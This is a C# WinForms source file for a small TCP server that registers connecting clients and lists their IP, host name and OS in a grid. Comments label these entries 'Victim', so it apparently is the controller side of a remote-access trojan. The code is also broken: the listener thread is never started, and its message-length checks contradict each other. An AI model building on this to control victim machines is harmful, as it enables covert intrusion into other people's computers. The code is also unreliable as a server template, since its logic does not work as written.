using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace miniServer
{
    public partial class ServerForm : Form
    {
        const string seperator = "|||";
        Thread serverThread;
        TcpListener serverTcp;

        public ServerForm()
        {
            InitializeComponent();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void configToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AboutBox1().ShowDialog();
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MessageBox.Show("Are you sure for Exit?", "Exit",MessageBoxButtons.YesNo) != DialogResult.Yes)
            {
                e.Cancel = true;
            }
        }

        private void ButtonStart_Click(object sender, EventArgs e)
        {
            buttonStart.Enabled = false;
            writelog("Server Started",null);
            buttonStop.Enabled = true;

            serverTcp = new TcpListener(IPAddress.Any, (int)numericUpDownPort.Value );
            serverTcp.Start();

            serverThread = new Thread(() =>
            {
                while (true)
                {
                    var tcpClient = serverTcp.AcceptTcpClient();
            byte[] helloBytes = null;

            
                    try
                    {
                        NetworkStream stream = tcpClient.GetStream();
                        byte[] bytes = new byte[4096];
                        int byteread = stream.Read(bytes, 0, bytes.Length);

                        //Decrypt recived data
                        helloBytes = new byte[byteread];
                        Array.Copy(bytes, helloBytes, byteread);

                        //TODO: Decrypt incomming
                        string incomming = Encoding.UTF8.GetString(helloBytes);

                        string[] stringSeparators = new string[] { seperator };
                        string[] recive = incomming.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
                        //Recived: clientid;;osVersion;;clientversion;;HostName(optinal)
                        if (recive.Length > 4)
                        {
                            int id = int.Parse(recive[0]);

                            string hostName = "";
                            if (recive.Length == 4)
                                hostName = recive[3];

                            //A new client
                            addNewClienet(tcpClient, recive[1], recive[2], recive[3], incomming, hostName);
                            return;

                        }
                        else//incorect recive data
                        {
                            writelog(tcpClient.Client.RemoteEndPoint.ToString() + "Connection Hello is incorrect :( ",
                                string.Format("Error Data={0}\nRecive Data={1} ", incomming, Encoding.ASCII.GetString(helloBytes, 0, byteread)));
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        writelog(tcpClient.Client.RemoteEndPoint.ToString() + " Error wile client connecting :( ", ex.Message + "\n" + Encoding.ASCII.GetString(helloBytes, 0, helloBytes.Length));
                        return;
                    }
                }
            });
        }
        void addNewClienet(TcpClient tcpClient, string os, string version, string keyClient, string incomming, string hostName)
        {
            miniClient mc = new miniClient(1, tcpClient, os, version, hostName);

            //Hello is for future use
            mc.SendToClient(mc.ID.ToString() + ";;" + "Hello");

            //ADD new client to datagridview
            DataGridViewRow row = new DataGridViewRow();
            row.CreateCells(dataGridViewClients);
            //TODO:IP country Flag
            //row.Cells[0].Value = getFlagOfIP(sc.IP);//IP country Flag
            row.Cells[1].Value = mc.ID;//ID
            //Note is emty
            row.Cells[3].Value = mc.IP;//Victim IP and Port
            row.Cells[4].Value = mc.HostName;//Victim HostName
            row.Cells[5].Value = mc.OS;//Victim OS version
            row.Cells[6].Value = mc.Version;//Client Version
            row.Cells[7].Value = "Yes";//isAlive

            writelog(mc.IP + " -> Connected :)", mc.IP + " -> Connected :) :\n" + incomming);         
        }

        void writelog(string log, string extradata)
        {
            richTextBoxLog.Invoke((MethodInvoker)delegate
            {
                richTextBoxLog.Text += DateTime.Now.ToString() + " " + log + "\n";
            });

            if (extradata == null)
                return;

            richTextBoxLog.Invoke((MethodInvoker)delegate
            {
                richTextBoxLog.Text += DateTime.Now.ToString() + " " + log + "\n" + extradata + "\n";
            });
        }

        private void ButtonStop_Click(object sender, EventArgs e)
        {
            buttonStart.Enabled = true;
            buttonStop.Enabled = false;
            serverThread.Abort();
            serverTcp.Stop();
         
            writelog("Server Stopped.",null);
        }
    }
}
